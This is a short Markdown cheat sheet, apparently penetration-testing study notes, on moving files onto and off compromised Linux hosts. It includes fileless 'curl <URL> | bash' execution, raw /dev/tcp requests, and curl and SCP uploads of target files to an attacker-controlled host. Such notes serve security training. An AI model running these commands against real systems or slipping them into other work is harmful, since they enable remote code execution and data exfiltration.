# Linux File Transfer Methods

## Download to Linux

Base64 encode on source, decode on target — no network needed:

```bash
cat <FILE> | base64 -w 0; echo
```

```bash
echo -n '<BASE64_BLOB>' | base64 -d > <OUTFILE>
md5sum <OUTFILE>
```

wget and curl to disk:

```bash
wget <URL> -O <OUTFILE>
curl -o <OUTFILE> <URL>
```

Fileless — pipe directly into interpreter, nothing touches disk:

```bash
curl <URL> | bash
wget -qO- <URL> | python3
```

Pure bash fallback — no curl/wget, just `/dev/tcp` (bash ≥ 2.04):

```bash
exec 3<>/dev/tcp/<TARGET>/80
echo -e "GET /<FILE> HTTP/1.1\n\n">&3
cat <&3
```

SCP pull from your attack host onto the target:

```bash
sudo systemctl start ssh
scp <USER>@<LHOST>:<REMOTE_PATH> .
```

---

## Upload from Linux

HTTPS upload server on attack host — self-signed cert, avoids cleartext:

```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

Upload from target — `--insecure` required for self-signed cert:

```bash
curl -X POST https://<LHOST>/upload -F 'files=@<FILE1>' -F 'files=@<FILE2>' --insecure
```

Spin up a web server on the compromised host, pull from attack host — use whatever's installed:

```bash
python3 -m http.server 8000
python2.7 -m SimpleHTTPServer 8000
php -S 0.0.0.0:8000
ruby -run -ehttpd . -p8000
```

Then pull from attack host:

```bash
wget <TARGET_IP>:8000/<FILE>
```

SCP push from target to attack host:

```bash
scp <FILE> <USER>@<LHOST>:<REMOTE_PATH>
```

> [!tip] If no upload method works, start a web server on the compromised host and pull from your attack machine — inbound to your attack host is almost always open, outbound from the target may not be.